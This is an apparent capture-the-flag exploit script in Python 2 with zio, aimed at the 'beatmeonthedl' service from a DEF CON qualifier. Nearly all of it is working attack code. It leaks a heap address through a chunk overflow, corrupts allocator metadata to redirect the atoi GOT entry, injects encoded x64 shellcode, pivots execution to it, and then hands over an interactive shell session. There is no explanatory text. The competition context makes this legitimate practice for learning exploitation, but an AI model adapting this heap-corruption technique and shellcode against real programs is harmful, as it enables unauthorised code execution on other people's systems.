from threading import Thread
# from uploadflag import *
from zio import *

target = ('119.254.101.197', 10000)
target = './beatmeonthedl'
target = ('beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me', 6969)

def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)

def login(io):
    io.read_until(':')
    io.writeline('mcfly')
    io.read_until(':')
    io.writeline('awesnap')

def menu(io, choice):
    io.read_until('Away.')
    io.writeline(str(choice))

def add_req(io, data):
    menu(io, 1)
    io.read_until('>')
    io.writeline(data)

def print_req(io):
    menu(io, 2)

def del_req(io, index):
    menu(io, 3)
    io.read_until(':')
    io.writeline(str(index))

def change_req(io, index, data):
    menu(io, 4)
    io.read_until(':')
    io.writeline(str(index))
    io.read_until(':')
    io.writeline(data)

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    login(io)

    add_req(io, '11111111')
    add_req(io, '22222222')
    add_req(io, '33333333')
    add_req(io, '44444444')
    add_req(io, '55555555')
    add_req(io, '66666666')
    add_req(io, '77777777')


    del_req(io, 1)
    del_req(io, 3)
    del_req(io, 5)

    #leak
    change_req(io, 0, 'a'*0x47)

    print_req(io)

    io.read_until('a'*0x47+'\n')
    leak_value = l64(io.readline()[:-1].ljust(8, '\x00'))
    print hex(leak_value)
    heap_base = leak_value - 0xe0

    atoi_got = 0x00000000006099D8
    payload = l64(atoi_got-0x18)*8
    change_req(io, 0, payload + l64(0x0000000000609E80)+l64(0x0000000000609E80))
    change_req(io, 2, 'b'*0x40 + l64(0x0000000000609E80)+l64(0x0000000000609E80))
    change_req(io, 4, 'c'*0x40 + l64(0x0000000000609E80)+l64(0x0000000000609E80))
    buf = ""
    buf += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
    buf += "\xef\xff\xff\xff\x48\xbb\xaa\xfb\x07\x50\x07\x4b\x98"
    buf += "\xc5\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += "\xc0\xc0\x5f\xc9\x4f\xf0\xb7\xa7\xc3\x95\x28\x23\x6f"
    buf += "\x4b\xcb\x8d\x23\x1c\x6f\x7d\x64\x4b\x98\x8d\x23\x1d"
    buf += "\x55\xb8\x0f\x4b\x98\xc5\x85\x99\x6e\x3e\x28\x38\xf0"
    buf += "\xc5\xfc\xac\x4f\xd9\xe1\x44\x9d\xc5"
    change_req(io, 6, buf)
    #change_req(io, 2, 'b'*0x50)
    #io.gdb_hint()
    sc_addr = 0x6161616161616161
    # shellcode64
    add_req(io, '88888')
    payload2 = '\x68'+l64(heap_base+0x1b0)+'\xc3'
    payload2 = payload2.ljust(0x10, 'a')
    change_req(io, 3, payload2+l64(heap_base+0x30)+l64(heap_base+0x60))

    add_req(io, '99999')
    menu(io, 1)

    interact(io)


exp(target)
